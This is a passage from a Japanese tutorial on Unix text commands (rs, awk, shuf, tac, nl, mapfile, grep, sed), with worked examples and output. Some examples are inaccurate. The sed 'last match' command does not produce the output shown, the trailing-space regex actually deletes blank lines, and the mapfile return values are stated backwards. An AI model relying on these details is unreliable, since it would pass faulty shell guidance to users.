

では行列を入れ替えます。
`rs -T`コマンドで簡単に入れ替えることができます。

```
$ cat sample.txt | rs -T
1  4  7
2  5  8
3  6  9
```


### awkコマンドで頑張ってみる場合

```
$ cat sample.txt
1 2 3
4 5 6
7 8 9
$ cat sample.txt | awk '
{ for(i=1;i<=NF;i++){a[NR,i]=$i}} NF>p {p=NF}
END{
  for(j=1;j<=p;j++){str=a[1,j]; for(i=2;i<=NR;i++){str=str" "a[i,j];}
    print str
  }
}'
1 4 7
2 5 8
3 6 9
```



## shufコマンド
`shuf`はファイルやキーボードから入力した内容をシャッフル（shuffle）して出力するコマンドです。
乱数を扱う`$RANDOM`コマンドとは異なり、同じものが2回出力されることはありません。
「1から10までの数字をランダムな順番で1回ずつ出力する」といった使い方も可能です。


### 基本的な使い方

パイプから入力を受け付けた要素(行)をシャッフル(ランダムに並べ替え)するという使い方になります。

```
seq 1 10 | shuf
10
3
7
1
6
9
5
2
8
4
```

### 出力する数を制限する
`shuf -n N` で、シャッフルした各要素からN個のデータを抽出して出力させる事ができます。

```
$ seq 1 10 | shuf
7
6
4
5
10
2
1
3
8
9
$ seq 1 10 | shuf -n3
8
7
4
```

### 数値の幅を制限する

001から020までをランダムに出力してみます。
```
bash-5.1$ shuf -e {001..020}
006
002
016
011
018
009
008
005
017
014
004
013
010
015
019
007
003
001
012
020
bash-5.1$
```

さらにこの出力から５つに絞って出力します。
```
bash-5.1$ shuf -e {001..020}
006
002
016
011
018
009
008
005
017
014
004
013
010
015
019
007
003
001
012
020
bash-5.1$ shuf -e {001..020} -n5
018
011
008
006
020
bash-5.1$
```

{{% tips-list tips %}}
ヒント
: どんなときに使えばよいのかわかりませんが、いざというときのために（？）頭のすみっこにおいておいてください。
{{% /tips-list %}}



## tacコマンド
`tac` コマンドはファイルの内容を逆順に出力するコマンドです。
最後の行が最初に表示されます。

`tac` という言葉は、`cat` という言葉の逆です。
tacコマンドの機能も、catコマンドの逆です。

通常の`cat`コマンドの実行結果
```
$ cat thegeekstuff.txt
1. Linux Sysadmin, Scripting etc.,
2. Databases Oracle, mySQL etc.,
3. Hardware
4. Security (Firewall, Network, Online Security etc)
5. Storage
6. Cool gadgets and websites
7. Productivity (Too many technologies to explore, not much time available)
8. Website Design
9. Software Development
10. Windows Sysadmin, reboot etc.,
11. Adding 1's and 0's
```

`tac` コマンドの実行結果
```
$ tac thegeekstuff.txt
11. Adding 1's and 0's
10. Windows Sysadmin, reboot etc.,
9. Software Development
8. Website Design
7. Productivity (Too many technologies to explore, not much time available)
6. Cool gadgets and websites
5. Storage
4. Security (Firewall, Network, Online Security etc)
3. Hardware
2. Databases Oracle, mySQL etc.,
1. Linux Sysadmin, Scripting etc.,
```


### 単語を逆順に並べるには
-s というオプションで区切り文字を指定できるので、行ではなく単語を逆順に並べることもできる。

```
$ echo -n "I'm feeling lucky." | tac -s ' '
lucky.feeling I'm 
```

さらに -r というオプションを使えば正規表現で区切り文字を指定できる。

```
$ echo -n "I'm feeling lucky." | tac -r -s '[^a-zA-Z]'
lucky.feeling m I'
```

### catコマンドと同様の書式でファイルの結合

２つのファイルがあります。
```
$ cat file_name1
abcde
fghij
klmno
```

```
$ cat file_name2
pqrst
uvwxy
z1234
```

２つのファイルをtacで結合すると以下の通りになります。
```
$ tac file_name1 file_name2
klmno
fghij
abcde
z1234
uvwxy
pqrst
```

tacでファイルを結合する場合は、各ファイルごとに最終行から逆に並べ替えた上で結合を行います。
　
このときの結果は、下記の様に catで結合した上で tacコマンドで並び替えたときの結果とは異なります。

```
$ cat file_name1 file_name2 | tac
z1234
uvwxy
pqrst
klmno
fghij
abcde
```

{{% tips-list tips %}}
ヒント
: どちらでも良いのではなく、後者を覚えましょう。
{{% /tips-list %}}


### 結合したファイルをファイルに出力

また、結合したファイルをファイルに出力する場合は、リダイレクトを使用します。


```
$ cat file_name1 file_name2 | tac > file_name3
```

こうすると、実行内容を画面に表示しながらファイルに出力できますね。

```
$ cat file_name1 file_name2 | tac | tee file_name3
```


### tacコマンドには行番号を表示するオプションがない

catコマンドには行番号を表示する「-n」オプションがありますが、「tac」コマンドにはこれに類似するオプションはありません。
　
そのため、行番号を表示する場合は、下記の様に catコマンドか、nlコマンドを併用します。

`cat -n` または、`nl` こまんどで行番号を振ります！

```
$ tac file_name1 | cat -n
$ tac file_name1 | nl
```


## nlコマンド
`nl` コマンドは、テキストファイルを行番号付きで出力するコマンドです。
`cat -n` コマンドでも行番号を付けることができますが、`nl` コマンドでは、正規表現など、より細かい設定が可能です。

### 行番号をつける
ファイルに行番号を追加するには、ファイルの名前を`nl` コマンドに渡すだけです。
デフォルトでは、ファイルのすべての行に行番号が追加されます。例として、以下の出力を参照してください。

```
bash-5.1$ nl distros.txt
     1	AlmaLinux
     2	Arch Linux
     3	CentOS
     4	Debian
     5	Fedora
     6	Gentoo
     7	Manjaro
     8	openSUSE
     9	Red Hat
    10	Ubuntu
bash-5.1$
```

これはこれで非常に便利なのですが、デフォルトでは、出力にタブ文字、行番号、がテキストの前に追加されました。
これは、特定のデータ文字列がどの行に表示されるかをすばやく確認するための優れた方法です。
しかし、他の状況ではあまり役に立たないかもしれません。
この出力のフォーマットを変更する方法を以下に示します。

### 行番号の書式を変更する
書式を少し変更してみます。
行番号をフォーマットする一般的な方法の １つは、番号の後にピリオドを置くことです。
`nl -s` のように-sオプションを使用します。

```
bash-5.1$ nl -s ". " distros.txt
     1. AlmaLinux
     2. Arch Linux
     3. CentOS
     4. Debian
     5. Fedora
     6. Gentoo
     7. Manjaro
     8. openSUSE
     9. Red Hat
    10. Ubuntu
bash-5.1$
```

### 行番号の手前のスペースを調整
行番号前のスペースを調整したい場合、`nl -w` (width) オプションで調整することができます。
スペースを完全に取り除くには、`nl -w1` （幅１）を指定します。
-sオプションを引き続き使用していることに注意してください。
これにより、両方の書式設定の変更が反映されます。

```
bash-5.1$ nl -w3 -s ". " distros.txt
  1. AlmaLinux
  2. Arch Linux
  3. CentOS
  4. Debian
  5. Fedora
  6. Gentoo
  7. Manjaro
  8. openSUSE
  9. Red Hat
 10. Ubuntu
bash-5.1$
```

### 開始番号を指定する
1 以外の番号から番号付けを開始したい場合は、-vオプションをnlと共に使用して、別の番号を指定できます。
例として、行番号を 100 から開始します。

```
bash-5.1$ nl -v100 -w3 -s ". " distros.txt
100. AlmaLinux
101. Arch Linux
102. CentOS
103. Debian
104. Fedora
105. Gentoo
106. Manjaro
107. openSUSE
108. Red Hat
109. Ubuntu
bash-5.1$
```

### `cat`コマンドで頑張ってみる
もちろん、`cat` こまんどでもできますが、調整はパイプで繋いで`sed` を使うなどするしかありません。
```
bash-5.1$ cat -n distros.txt
     1	AlmaLinux
     2	Arch Linux
     3	CentOS
     4	Debian
     5	Fedora
     6	Gentoo
     7	Manjaro
     8	openSUSE
     9	Red Hat
    10	Ubuntu
bash-5.1$
```

### awkコマンドで頑張ってみる
`cat -n` コマンドでの実現で、微調整に`sed`コマンドが必要なのであれば、最初から`sed`コマンドで行う方法もあります。

```
bash-5.1$ awk '{print NR, $0}' distros.txt
1 AlmaLinux
2 Arch Linux
3 CentOS
4 Debian
5 Fedora
6 Gentoo
7 Manjaro
8 openSUSE
9 Red Hat
10 Ubuntu
bash-5.1$
```


{{% tips-list tips %}}
ヒント
: やり方は無限にあります。
: 解決方法は１つではありませんので、色々考えて見てください。
{{% /tips-list %}}



## mapfile（マップファイル）

bash シェルの `mapfile` コマンドは、読み取り配列としてよく知られています。
主な目的は、標準入力行を読み取り、それらをインデックス付き配列変数に格納することです。
`mapfile` は、パイプではなく置換 (<) から読み取る必要があります。
さらに、読み取りループと比較して、`mapfile` ははるかに高速で便利なソリューションです。
コマンドの実行が成功した場合は 1 を返し、失敗した場合は 0 を返します。
配列名を指定しない場合、`mapfile` 変数がデフォルトの配列変数となります。



### データテキストの準備
ここで簡単なデータテキスト用意します。

``` bash:data.txt
One
Two
Three
```

### 普通のやり方 while read パターン
このテキストを読み込んで配列にデータを格納したいと思います。
多少冗長ではありますが通常は以下のような感じになります。


``` bash:array01.sh
#!/usr/bin/bash

DATAFILE="data.txt";  # データファイル
declare -a aLine;     # 配列の宣言
declare -i COUNT=0;   # カウンターの宣言
IFS=$'\n';            # 区切り文字を改行コードに指定
 
while read line;do
  # １行ずつ読み込んだ内容 $line を配列に代入
  aLine[$COUNT]="$line";
  ((COUNT++));    # インクリメント
done<$DATAFILE    # ファイルの入力

echo "配列の内容すべてを表示"
echo ${aLine[@]}; # One Two Three
echo "添字の0を表示"
echo ${aLine[0]}; # One
echo "添字の1を表示"
echo ${aLine[1]}; # Two
echo "添字の2を表示"
echo ${aLine[2]}; # Three
```

実行結果は以下のとおりです。
```
bash-3.2$ bash array01.sh
配列の内容すべてを表示
One Two Three
添字の0を表示
One
添字の1を表示
Two
添字の2を表示
Three
bash-3.2$
```


### 普通のやり方 fileコマンドパターン

ファイルの読み込みを以下のようにすることもできますね。

``` bash:array02.sh
#!/usr/bin/bash

DATAFILE="data.txt";  # データファイル
declare -a aLine;     # 配列の宣言
declare -i COUNT=0;   # カウンターの宣言
IFS=$'\n';            # 区切り文字を改行コードに指定
 
# ファイルを配列に読み込む
file=(`cat "$DATAFILE"`)
 
# 行ごとに繰り返し処理を実行
for line in "${file[@]}"; do
  # １行ずつ読み込んだ内容 $line を配列に代入
  aLine[$COUNT]="$line";
  ((COUNT++));    # インクリメント
done


echo "配列の内容すべてを表示"
echo ${aLine[@]}; # One Two Three
echo "添字の0を表示"
echo ${aLine[0]}; # One
echo "添字の1を表示"
echo ${aLine[1]}; # Two
echo "添字の2を表示"
echo ${aLine[2]}; # Three
```

実行結果は以下のとおりです。
```
bash-3.2$ bash array02.sh
配列の内容すべてを表示
One Two Three
添字の0を表示
One
添字の1を表示
Two
添字の2を表示
Three
bash-3.2$
```

### 登場！ mapfile を使う
なんと、ファイル読み込みや配列への代入にあれこれやっていましたが、mapfileを使うと１行で住みます。
`COUNT`変数といったカウンターや IFSといった定義も不要です。


``` :data02.txt
One Two Three
Four Five Six
Seven Eight Nine
Ten
```


``` bash:array03.sh
#!/usr/bin/bash

DATAFILE="data.txt";  # データファイル
declare -a aLine;     # 配列の宣言
 
# -t は行末の改行を除去
mapfile -t aLine < "$DATAFILE";

echo "配列の内容すべてを表示"
echo ${aLine[@]}; # One Two Three
echo "添字の0を表示"
echo ${aLine[0]}; # One
echo "添字の1を表示"
echo ${aLine[1]}; # Two
echo "添字の2を表示"
echo ${aLine[2]}; # Three
```

実行結果はいずれも同じですが以下のとおりです。
```
bash-3.2$ bash array03.sh
配列の内容すべてを表示
One Two Three
添字の0を表示
One
添字の1を表示
Two
添字の2を表示
Three
bash-3.2$
```

すごいですね。
配列に入れるだけなら`mapfile`で十分です。しかも読み込み専用ということもあり、読み込み速度は通常の数十倍高速です。

### 列の代入
ここで余談ですが、これまでは行の読み込みを行い、行を単位に配列に格納してきました。
列の中で空白区切りで値が入っている場合の配列への代入はどうしましょう？


こうなります。


``` bash:col.sh
#!/usr/bin/bash

# １行に３つの値が空白区切りで並んでいます
read -a aLine <<< "One Two Three"

echo "配列の内容すべてを表示"
echo ${aLine[@]}; # One Two Three
echo "添字の0を表示"
echo ${aLine[0]}; # One
echo "添字の1を表示"
echo ${aLine[1]}; # Two
echo "添字の2を表示"
echo ${aLine[2]}; # Three
```

実行結果は以下のとおりです。

```
bash-3.2$ bash col.sh
配列の内容すべてを表示
One Two Three
添字の0を表示
One
添字の1を表示
Two
添字の2を表示
Three
bash-3.2$
```

### データファイルからの入力
では、データファイルの構造を少し複雑にしてみます。

``` data02.txt
One Two Three
Four Five Six
Seven Eight Nine
Ten
```

`mapfile`コマンドで行の内容を配列に入れる方法は説明しましたが、今回は、行の中で空白区切りの値が３つあります。
こうしたデータ構造を`mapfile`に加えて`read`コマンドを使って効率的に、かつ高速に読み込んでみます。


``` bash:colArray.sh
#!/usr/bin/bash

DATAFILE="data02.txt";
declare -a aLine;

# データファイルを読み込みます。
mapfile -t aLine<"$DATAFILE";

for((i=0;i<4;i++));do

  # 行の内容を読み込み、空白区切りで配列に格納します
  read -a var <<< "${aLine[$i]}";

  echo "varの中身は以下の通り";
  echo "${var[@]}";
  echo "添字の0を表示"
  echo ${var[0]}; # One
  echo "添字の1を表示"
  echo ${var[1]}; # Two
  echo "添字の2を表示"
  echo ${var[2]}; # Three
done
```

実行結果は以下のとおりです。

```
bash-3.2$ bash colArray.sh
varの中身は以下の通り
One Two Three
添字の0を表示
One
添字の1を表示
Two
添字の2を表示
Three
varの中身は以下の通り
Four Five Six
添字の0を表示
Four
添字の1を表示
Five
添字の2を表示
Six
varの中身は以下の通り
Seven Eight Nine
添字の0を表示
Seven
添字の1を表示
Eight
添字の2を表示
Nine
varの中身は以下の通り
Ten
添字の0を表示
Ten
添字の1を表示

添字の2を表示

bash-3.2$
```

最後の行は値が一つしかありません（Ten）
必要であれば値がない場合は出力しないなどの処理をすれば良さそうです。
（配列的には別に値がなくても問題はないと思いますが）


`mapfile`と`read`コマンドを上手に使って、効率的に配列に代入してください。



## grepコマンド
- コマンドの実行結果から必要な箇所だけを抽出する
- 単語単位で検索する
- 前後の行も表示する
- 行番号付きで表示する
- 複数の文字列を指定して検索する
- 複数の文字列を指定して検索する（正規表現）
- 検索文字列をファイルから読み込む
- どちらも含む行を探したい場合
- 文字列を含まない行を対象にする

### grepコマンド概要
「grep」コマンドは、ファイル中の「文字列（パターン）」が含まれている行を表示するコマンドで、UNIX/Linuxで、最も頻度高く利用されているコマンドの一つです。

　文章中に検索したい文字列の位置や頻出回数を確認する
　ディレクトリ中のファイル一覧を作成し、そのファイル一覧から、該当するファイル名を探索する。

{{% tips-list tips %}}
ヒント
: 抽出した結果をさらに「パイプ｜コマンド」で絞り込んだり、その結果を別のファイルに出力したりすることも簡単にできます。
{{% /tips-list %}}
 
### grepコマンドの書式
grep [オプション] 検索パターン ファイル
コマンド | grep [オプション] 検索パターン


### grepコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-i            |大文字と小文字を区別しない|
|-v            |パターンに一致しない行を表示する|
|-n            |行番号を併せて表示する|
|-C            |一致した行の前後の行も表示する|
|-e            |検索パターンを指定する|
|-f            |ファイルに書かれているパターンを検索する|

{{% tips-list tips %}}
ヒント
: 一覧のオプションは一部です。 $ man grep   などで、grepの使い方を確認してください。
{{% /tips-list %}}


### grepコマンド詳細説明

### コマンドの実行結果から必要な箇所だけを抽出する
　「dmesg」コマンド（起動時のシステムメッセージを再表示するコマンド）の実行結果から、grepコマンドで“volume”という文字列を含む行だけを表示したい場合は「dmesg | grep volume」と指定します 

システムメッセージを表示する
```
$ dmesg
```

システムメッセージの出力から「volume」を含む行を抽出する
```
$ dmesg | grep volume
```

大文字と小文字を「-iオプション」を付与して区別しないで抽出する
```
$ dmesg | grep -i volume
```

{{% tips-list tips %}}
ヒント
: dmesg コマンドは、システムメッセージを表示するコマンドです。
{{% /tips-list %}}

### 単語単位で検索する
「volume」という文字列を検索したい場合、、検索結果には「volume」と「vboxvolume」が表示される場合もあります。“volumeという単語のみ”を検索対象としたい場合には、「-w」オプション（--word-regexp）を使用します

単語単位で検索する
```
$ dmesg | grep -i -w volume
```

### 前後の行も表示する

　文字列を検索する際には、該当する行の前後も表示されていると分かりやすい場合があります。例えば、前後2行ずつ表示したい場合は、「-2」のように数字で指定します。これは「-C（--context=）」オプションと同じです。

```
$ dmesg | grep -w -C2 volume
```

{{% tips-list tips %}}
ヒント
: ログなどでの利用は効果的ではありませんが、ドキュメント内を検索する場合に、GoogleのSnippetのように前後の文章が表示されることで、よりわかりやすくなります。さらに次の項目では、検索結果の評判号を表示させることもできます。
{{% /tips-list %}}

### 行番号付きで表示する

grepコマンドでの検索結果に行番号を付けて表示したい場合は、「-n」オプション（--line-number）を使用します。「行番号:」のように表示されますが、前後の行も併せて表示している場合は、前後の行は「行番号-」のように「-」記号で、該当する行は「:」記号で示されます。

```
$ dmesg | grep -w -C2 -n volume
```

### 複数の文字列を指定して検索する

grepコマンドで「volumeまたはkeybagを含む行を検索」のように、複数の文字列を検索したい場合には、「-e」オプションを付けて、それぞれが「検索パターン」であることを明示します。

```
$ dmesg | grep -i -e keybag -e volume
```

### 複数の文字列を指定して検索する

複数の文字列を検索したい場合、正規表現で“または”という意味の「|」記号を使って指定することもできます。

```
$ dmesg | grep -i "keybag\|volume"
```
{{% tips-list tips %}}
ヒント
: ここでは OR 条件で抽出することを目的としています。AND条件で抽出する場合は、grep コマンドを「|」パイプコマンドで連結させます。
{{% /tips-list %}}


どちらの検索ワードも含む行
```
$ dmesg | grep -i volume | grep -i keybag
```

### 検索文字列をファイルから読み込む

検索したい文字列が常に決まっている場合や、他のコマンドで単語をリストアップしているなどで、検索文字列のリストがあるような場合、「-f」オプションでリストのファイルを指定するとよいでしょう。

```
$ cat wordlist
keybag
volume
$ dmesg | grep -i -f wordlist
```

{{% tips-list tips %}}
ヒント
: この使い方は意外と知られていないのです。一般的にはwordlistをシェルスクリプトであらかじめ作成しておき、while read line; do などで wordlistを順番にgrepコマンドに渡す手法が多いです。
{{% /tips-list %}}

```:bash 

:> wordlist
echo "keybag" >> wordlist;
echo "volume" >> wordlist;

cat wordlist | while read line; do
  echo "$line での検索";
  dmesg | grep "$line" ;
  echo "";
done
```



### どちらも含む行を探したい場合

　「どちらの検索ワードも含む行」としたい場合は、検索結果をさらにgrepするのが簡単です。

```
$ dmesg | grep -i volume
$ dmesg | grep -i keybag 

# どちらの検索ワードも含む行
$ dmesg | grep -i volume | grep -i keybag
```

### 文字列を含まない行を対象にする
grepコマンドで「～を含まない行」だけを表示したい場合は「-v」オプション（「--invert-match」オプション）を使います。

```
# keybag を含みvolumeを含まない検索結果
$ dmesg | grep -i keybag | grep -v volume
```

{{% tips-list tips %}}
ヒント
: -v オプションはgrepコマンドのオプションの中で最も強力で利用頻度が高いです。「パターンに一致しない行を表示する」という意味合いとなります。
{{% /tips-list %}}



## sedコマンド
　「sed」は「Stream EDitor」の略で、「sed スクリプトコマンド ファイル名」で、指定したファイルをコマンドに従って処理し、標準出力へ出力します。ファイル名を省略した場合は、標準入力からのデータを処理します。sedコマンドでは、パイプとリダイレクトを活用するのが一般的です。


### sedコマンドの書式
sed [オプション]
sed [オプション] スクリプトコマンド 入力ファイル


### sedコマンドの主なオプション

|オプション    |意味|
|--------------|----|
|-e スクリプト|スクリプト（コマンド）を追加する|
|-f スクリプトファイル|実行するコマンドとしてスクリプトファイルの内容を追加する|

|-t 文字数	   |タブの文字数またはタブ位置のリストを指定する|


### sedのバージョンを確認する

```
$ sed --version
```

僕の環境では以下のとおりです
```
bash-5.1$ sed --version
gsed (GNU sed) 4.8
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <https://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Written by Jay Fenlason, Tom Lord, Ken Pizzini,
Paolo Bonzini, Jim Meyering, and Assaf Gordon.

This sed program was built without SELinux support.

GNU sed home page: <https://www.gnu.org/software/sed/>.
General help using GNU software: <https://www.gnu.org/gethelp/>.
E-mail bug reports to: <bug-sed@gnu.org>.
bash-5.1$
```

### sedコマンド詳細説明

### 'sed'を使用した基本的なテキスト置換
`sed`コマンドを使用してパターンを検索および置換することにより、テキストの特定の部分を検索および置換できます。次の例では、「s」は検索および置換タスクを示します。「BashScriptingLanguage」というテキストで「Bash」という単語が検索され、その単語がテキストに存在する場合は、「Perl」という単語に置き換えられます。

```
bash-5.1$ echo "Bash Scripting Language" | sed 's/Bash/Perl/'
Perl Scripting Language
bash-5.1$
```

{{% tips-list tips %}}
ヒント
: '' シングルクォーテーションで囲む場合と""ダブルクォーテーションで囲む場合、動作が異なります。置換前と、置換後の文字列指定を「文字列」で扱う場合はシングルクォーテーションで構いませんが、s/Bash/$value/ などの変数で置き換えたい場合はダブルクォーテーションで囲みます。
{{% /tips-list %}}

{{% tips-list tips %}}
ヒント
: s/Bash/Perl/ と指定する場合の s ですが、substitute（置き換える）です。
{{% /tips-list %}}



まず、weekday.txtを作成します。
```:weekday.txt
Monday
Tuesday
Wednesday
Thursday
Friday
Saturday
Sunday
```

以下のコマンドで Sunday を　Sunday is holiday に置き換えます
```
$ cat weekday.txt | sed 's/Sunday/Sunday is holiday/'
```

実行結果は以下のとおりです。
```
bash-5.1$ cat weekday.txt | sed 's/Sunday/Sunday is holiday/'
Monday
Tuesday
Wednesday
Thursday
Friday
Saturday
Sunday is holiday
bash-5.1$
```


### 'g'オプションを使用して、ファイルの特定の行にあるテキストのすべてを置き換える
'g'オプションは、ファイル内の一致するパターンすべてを置き換えます。

まずpython.txtを作成します
```:python.txt
Python is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
```

以下のコマンドで Python を perl に置き換えます。
```
$ cat python.txt | sed 's/Python/perl/g' python.txt
```

実行結果は以下のとおりです。
```
bash-5.1$ cat python.txt | sed 's/Python/perl/g'
perl is a very popular language.
perl is easy to use. perl is easy to learn.
perl is a cross-platform language
```

{{% tips-list tips %}}
ヒント
: s/Python/perl/g と指定する場合の g ですが、global(全体的に）です。
{{% /tips-list %}}



次に２行目の Python を perlに置き換えます。
置き換えたい行数を 2 と指定しています。

```:python.txt
Python is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
```

```
$ cat python.txt | sed '2 s/Python/perl/g' python.txt
```

実行結果は以下のとおりです。
```
bash-5.1$ cat python.txt | sed '2 s/Python/perl/g'
Python is a very popular language.
perl is easy to use. perl is easy to learn.
Python is a cross-platform language
```


### 各行で一致する2番目の値のみを置き換える
ファイル中に存在するPythonを、各行の2番目に出現する検索パターンだけをperlに置き換えます。

g2オプションを使います。

```:python.txt
Python is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
```

実行結果は以下のとおりです。
```
bash-5.1$ cat python.txt | sed 's/Python/perl/g2'
Python is a very popular language.
Python is easy to use. perl is easy to learn.
Python is a cross-platform language
bash-5.1$
```


### 各行で一致する最後の値のみを置き換える
ファイル中に存在するPythonを、各行の最後に出現する検索パターンだけをperlに置き換えます。

```:python.txt
Python is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
```

実行結果は以下のとおりです。
```
bash-5.1$ cat python.txt | sed 's/\(.*\)Programming/\1Scripting/' 
Python is a very popular language.
Python is easy to use. perl is easy to learn.
Python is a cross-platform language
bash-5.1$
```

{{% tips-list tips %}}
ヒント
: \\\(.\*\\\)  の部分は正規表現といいます。正規表現は記号を含めて無限に指定することができる激しく便利な機能です。ポピュラーな使い方から覚えて、次第と複雑でトリッキーな使い方を習得していけば良いと思います。Google で sed 正規表現　と検索すればたくさん検索結果が出てきます。
{{% /tips-list %}}


### ファイル内の最初の一致を新しいテキストに置き換える
次のコマンドは、検索パターンの最初の一致である「Python」のみをテキスト「perl」に置き換えます。ここで、「1」はパターンの最初の出現に一致するために使用されます。

```:python.txt
Python is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
```

実行結果は以下のとおりです。
```
$ cat python.txt | sed '1 s/Python/perl/'
perl is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
```


### ファイル内の最後の一致を新しいテキストに置き換える
次のコマンドは、最後に出現した検索パターン「Python」をテキスト「Bash」に置き換えます。ここで、「$」記号は、パターンの最後の出現と一致するために使用されます。

```:python.txt
Python is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
```

実行結果は以下のとおりです。
```
$ cat python.txt | sed '$s/Python/perl/'
Python is a very popular language.
Python is easy to use. Python is easy to learn.
perl is a cross-platform language
```

{{% tips-list tips %}}
ヒント
: 「ファイル内」の最後のマッチです。
{{% /tips-list %}}


### ファイルパスの検索と置換を管理するためのreplaceコマンドでのバックスラッシュのエスケープ
検索および置換するには、ファイルパスのバックスラッシュをエスケープする必要があります。次の`sed`コマンドは、ファイルパスにバックスラッシュ記号（\）を追加します。

{{% tips-list tips %}}
ヒント
: \\記号はウインドウズだと￥で表示されます。
Macでは￥キーを押すことで\\バックスラッシュを入力することできます。
Macで￥キーを押してもバックスラッシュが入力できない場合は、はOptionキーを押しながら￥を押すことでバックスラッシュを入力することができます。一般的に￥と\\は区別されています。
{{% /tips-list %}}


実行結果は以下のとおりです。
```
$ echo /home/ubuntu/code/perl/add.pl | sed 's;/;\\/;g'
\/home\/ubuntu\/code\/perl\/add.pl
$
$ echo /home/ubuntu/code/perl/add.pl | sed 's|/|\\/|g'
\/home\/ubuntu\/code\/perl\/add.pl
```

{{% tips-list tips %}}
ヒント
: 上記では「s;」とすることで、セミコロンを区切り文字として指定しています。理由は見た目がわかりやすいからです。
何でもいいのです。「s|」とすれば、区切り文字はパイプに指定することができます。
{{% /tips-list %}}


### ファイルのフルパスをファイル名だけに置き換える
ファイル名は、`basename`コマンドを使用してファイルパスから非常に簡単に取得できますが、`sed`コマンドを使用して、ファイルパスからファイル名を取得することもできます。次のコマンドは、`echo`コマンドで指定されたファイルパスからのみファイル名を取得します。

```
$ basename "/home/ubuntu/temp/myfile.txt"
myfile.txt

$ echo "/home/ubuntu/temp/myfile.txt" | sed 's/.*\///'
myfile.txt
$
```

{{% tips-list tips %}}
ヒント
: basename コマンドを使うのが一般的ですが、sedに置き換えることでsedの正規表現の理解を深めることが狙いです。 
{{% /tips-list %}}


### マッチした文字列のあとに出現した文字列が見つかった場合に置換する
次の`sed`コマンドでは、2つの置換コマンドが使用されています。文字列「CSE 」でマッチした行で「Count 」は100に置き換えられ、文字列「EEE」でマッチした行で「Count」は70に置き換えられます。

```:dept.txt
CSE - Count
EEE - Count
Civil - Count
```

実行結果は以下のとおりです。
```
$ cat dept.txt | sed  -e '/CSE/ s/Count/100/; /EEE/ s/Count/70/;'
CSE - 100
EEE - 70
Civil - Count
```

{{% tips-list tips %}}
ヒント
: 以外に知られていないトリッキーなsedの利用例ですが、とてもよく使われます。
{{% /tips-list %}}

### 文字列に他のテキストが見つからない場合のみテキストを置き換える
次の`sed`コマンドは、テキスト「CSE」を含まない行の「Count」値を置き換えます。dept.txtファイルには、テキスト「CSE」を含まない2行が含まれています。したがって、「カウント」テキストは2行で80に置き換えられます。

```:dept.txt
CSE - Count
EEE - Count
Civil - Count
```

実行結果は以下のとおりです。
```
$ cat dept.txt | sed '/CSE/! s/Count/80/;'
CSE - Count
EEE - 80
Civil - 80
```

{{% tips-list tips %}}
ヒント
: !（アポストロフィー）をつけると「以外は」という意味になります。
{{% /tips-list %}}


### ' \ 1 'を使用して、一致するパターンの前に文字列を追加
`sed`コマンドで一致するパターンマッチは、「\\1」、「\\2」などで示されます。

次の`sed`コマンドは、パターン'Bash'を検索し、パターンが一致する場合は、テキストを置き換える部分「bash」を'\1'として処理をします。
ここでは、入力テキストで「Bash」というテキストが検索され、「\\1」の前に1つのテキストが追加され、後に別のテキストが追加されます。

```
$ echo "Bash language" | sed  's/\(Bash\)/Learn \1 programming/'
Learn Bash programming language
```

{{% tips-list tips %}}
ヒント
: 難しく考える必要はありません。's/\(文字列\)/ で文字列を検索します。その後、検索した文字列を \\1 として、文字A \1 文字B として出力します。
{{% /tips-list %}}

### 一致する行を削除
'd'オプションは、ファイルから任意の行を削除するために`sed`コマンドで使用されます。os.txtという名前のファイルを作成し、次のコンテンツを追加して、 「d」オプションの機能をテストします。

```:os.txt
Windows
Linux
Android
OS
```

実行結果は以下のとおりです。
```
$ cat os.txt | sed '/OS/ d'
Windows
Linux
Android
bash-5.1$
```

{{% tips-list tips %}}
ヒント
: d オプションは、delete（削除）です。
{{% /tips-list %}}


### 一致する行の後の2行を削除
次のコマンドは、パターン「Linux」が見つかった場合、ファイルos.txtから3行を削除します。os.txtには、2行目に「Linux 」というテキストが含まれています。したがって、この行と次の2行は削除されます。

```:os.txt
Windows
Linux
Android
OS
```

実行結果は以下のとおりです。
```
$ cat os.txt | sed '/Linux/,+2d'
Windows
```


### テキスト行の最後にあるすべてのスペースを削除
[:blank:]クラス（といいます）を使用すると、テキストまたは任意のファイルのコンテンツからスペースとタブを削除できます。次のコマンドは、ファイルos.txt  の各行の終わりにあるスペースを削除します。

以下のテキストの行末には半角スペースが３つづつついています。（みえないけど）
```:os_space.txt
Windows   
Linux   
Android   
OS   
```

実行結果は以下のとおりです。
```
$ cat os_space.txt
Windows
Linux
Android
OS
$
$ cat os_space.txt | sed '/^[[:blank:]]*$/d'
Windows
Linux
Android
OS
```

出力されたテキストには、半角スペースが除去されています（みえないけど）


### 行で2回一致するすべての行を削除
次の内容のinput.txtという名前のテキストファイルを作成し、検索パターンを含むファイルの行を2回削除します。

```:input.txt
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is platform-independent.
```

input.txtファイルには一行に「PHP」というワードが２回表示される行が２行あります。
以下の例では、`sed`コマンドの -e オプションを使って、sedコマンドを連続して使用し、パターン'PHP'を含む２行を削除します。

最初の`sed`コマンドは、各行の2番目に出現する'PHP'を'dl'に置き換え、次の`sed`コマンド「-e」で、テキスト' dl 'を含む行を「dオプション」で削除します。


実行結果は以下のとおりです。
```
cat input.txt
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is platform-independent.
$
$ cat input.txt | sed -e 's/php/dl/i2;' -e '/dl/d'
PHP is a server-side scripting language.
PHP is platform-independent.
```


### 空行を削除
この例をテストするには、コンテンツに空の行が含まれているファイルを選択します。前の例で作成されたinput.txtファイルには、次の`sed`コマンドを使用して削除できる2つの空の行が含まれています。ここで、「^$」は、ファイルinput.txtの空の行を見つけるために使用されます。

```:os_blank.txt
Windows

Linux

Android

OS
```

実行結果は以下のとおりです。
```
$ cat os_blank.txt
Windows

Linux

Android

OS

